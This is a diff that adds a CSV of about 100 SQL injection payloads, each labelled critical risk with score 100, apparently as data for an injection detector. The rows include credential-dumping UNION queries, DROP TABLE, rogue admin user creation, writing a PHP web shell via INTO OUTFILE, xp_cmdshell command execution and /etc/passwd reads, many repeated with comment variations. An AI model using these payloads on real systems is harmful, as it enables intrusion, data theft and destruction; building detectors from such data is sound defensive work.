@@ -1,0 +1,101 @@
+query,risk,score
+"' UNION SELECT username, password FROM users /**/ /*",critical,100
+'; DROP TABLE users; -- /* test */,critical,100
+"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); --",critical,100
+'; DROP TABLE users; -- /* test */,critical,100
+'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; --,critical,100
+'; DROP TABLE users; -- /* test */,critical,100
+'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; --,critical,100
+'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; --,critical,100
+' INTO OUTFILE '/var/www/shell.php' --,critical,100
+'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); --,critical,100
+'; SELECT load_file('/etc/passwd'); #,critical,100
+' INTO OUTFILE '/var/www/shell.php' --,critical,100
+' INTO OUTFILE '/var/www/shell.php' --,critical,100
+'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; --,critical,100
+"' UNION SELECT username, password FROM users /**/ /*",critical,100
+'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; --,critical,100
+"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); --",critical,100
+'; SELECT * FROM mysql.user; --,critical,100
+"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); --",critical,100
+'; EXEC xp_cmdshell('net user hack hack /add'); --,critical,100
+"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); --",critical,100
+"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); --",critical,100
+"' UNION SELECT username, password FROM users /**/ /*",critical,100
+'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; --,critical,100
+"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); --",critical,100
+'; SELECT load_file('/etc/passwd'); #,critical,100
+'; SELECT * FROM mysql.user; --,critical,100
+'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); --,critical,100
+'; USE information_schema; SELECT table_schema FROM tables; --,critical,100
+'; DROP TABLE users; -- /* test */,critical,100
+"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); --",critical,100
+'; USE information_schema; SELECT table_schema FROM tables; --,critical,100
+"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); --",critical,100
+'; DROP TABLE users; -- /* test */ -- ,critical,100
+'; DROP TABLE users; -- /* test */ -- ,critical,100
+"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- ",critical,100
+'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- -- ,critical,100
+"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- ",critical,100
+'; DROP TABLE users; -- /* test */ -- ,critical,100
+'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- -- ,critical,100
+"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- -- ",critical,100
+'; DROP TABLE users; -- /* test */ -- ,critical,100
+'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- ,critical,100
+'; SELECT load_file('/etc/passwd'); # -- ,critical,100
+'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- ,critical,100
+"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- ",critical,100
+"' UNION SELECT username, password FROM users /**/ /* -- ",critical,100
+'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- -- ,critical,100
+'; SELECT load_file('/etc/passwd'); # -- ,critical,100
+'; SELECT * FROM mysql.user; -- -- ,critical,100
+'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- -- ,critical,100
+'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- ,critical,100
+"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- -- ",critical,100
+'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- -- ,critical,100
+' INTO OUTFILE '/var/www/shell.php' -- -- ,critical,100
+' INTO OUTFILE '/var/www/shell.php' -- -- ,critical,100
+' INTO OUTFILE '/var/www/shell.php' -- -- ,critical,100
+'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- -- ,critical,100
+"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- ",critical,100
+"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- ",critical,100
+'; SELECT * FROM mysql.user; -- -- ,critical,100
+'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- -- ,critical,100
+"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- ",critical,100
+'; SELECT load_file('/etc/passwd'); # -- ,critical,100
+'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- -- ,critical,100
+'; SELECT load_file('/etc/passwd'); # -- ,critical,100
+'; EXEC xp_cmdshell('net user hack hack /add'); -- # ,critical,100
+'; SELECT load_file('/etc/passwd'); # # ,critical,100
+"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # ",critical,100
+'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # ,critical,100
+'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- # ,critical,100
+'; EXEC xp_cmdshell('net user hack hack /add'); -- # ,critical,100
+'; USE information_schema; SELECT table_schema FROM tables; -- # ,critical,100
+'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- # ,critical,100
+'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # ,critical,100
+'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- # ,critical,100
+'; USE information_schema; SELECT table_schema FROM tables; -- # ,critical,100
+'; DROP TABLE users; -- /* test */ # ,critical,100
+'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # ,critical,100
+'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- # ,critical,100
+'; DROP TABLE users; -- /* test */ # ,critical,100
+' INTO OUTFILE '/var/www/shell.php' -- # ,critical,100
+'; SELECT * FROM mysql.user; -- # ,critical,100
+'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- # ,critical,100
+"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # ",critical,100
+'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # ,critical,100
+'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # ,critical,100
+'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # ,critical,100
+'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- # ,critical,100
+'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- # ,critical,100
+'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # ,critical,100
+'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- # ,critical,100
+'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # ,critical,100
+'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # ,critical,100
+"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # ",critical,100
+'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- # ,critical,100
+"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # ",critical,100
+'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- # ,critical,100
+'; DROP TABLE users; -- /* test */ # ,critical,100
+'; SELECT * FROM mysql.user; -- # ,critical,100
